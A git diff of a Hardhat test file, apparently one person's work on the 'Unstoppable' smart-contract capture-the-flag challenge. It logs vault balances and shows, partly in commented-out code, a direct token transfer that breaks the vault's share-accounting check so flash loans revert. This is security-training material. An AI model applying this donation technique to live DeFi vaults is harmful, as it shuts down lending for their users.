@@ -43,16 +43,48 @@ describe('[Challenge] Unstoppable', function () {
         await receiverContract.executeFlashLoan(100n * 10n ** 18n);
     });
 
-    it('Execution', async function () {
+    it('Info', async function () {
         /** CODE YOUR SOLUTION HERE */
-    });
+        let balanceVault = (await token.balanceOf(vault.address));
+        let totalAssetVault = (await vault.totalAssets());
+        let totalSupplyVault = (await vault.totalSupply());
+        let convertToShares = (await vault.convertToShares(totalSupplyVault));
+        
+        console.log("BalanceVault: ",balanceVault.toString());
+        console.log("totalAssetVault: ",totalAssetVault.toString());
+        console.log("totalSupplyVault: ",totalSupplyVault.toString());
+        console.log("convertToShares: ",convertToShares.toString());
 
-    after(async function () {
-        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+        await token.connect(player).transfer(vault.address,5n * 10n ** 18n);
 
-        // It is no longer possible to execute flash loans
-        await expect(
-            receiverContract.executeFlashLoan(100n * 10n ** 18n)
-        ).to.be.reverted;
+        balanceVault = (await token.balanceOf(vault.address));
+        totalAssetVault = (await vault.totalAssets());
+        totalSupplyVault = (await vault.totalSupply());
+        convertToShares = (await vault.convertToShares(totalSupplyVault));
+
+        console.log("after transfer: ")
+        console.log("BalanceVault: ",balanceVault.toString());
+        console.log("totalAssetVault: ",totalAssetVault.toString());
+        console.log("totalSupplyVault: ",totalSupplyVault.toString());
+        console.log("convertToShares: ",convertToShares.toString());
     });
+    
+    // it('Execution', async function () {
+    //     /** CODE YOUR SOLUTION HERE */
+    //     await token.connect(player).transfer(vault.address,1n * 10n ** 18n);
+    //     expect(await token.balanceOf(player.address)).to.eq(9n * 10n ** 18n);
+    //     await receiverContract.executeFlashLoan(100n * 10n ** 18n);
+
+    // });
+    //to send tokens without use `deposit function` you make a false in:
+    // 'convertToShares(totalSupply) != balanceBefore'
+
+    // after(async function () {
+    //     /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+
+    //     // It is no longer possible to execute flash loans
+    //     await expect(
+    //         receiverContract.executeFlashLoan(100n * 10n ** 18n)
+    //     ).to.be.reverted;
+    // });
 });
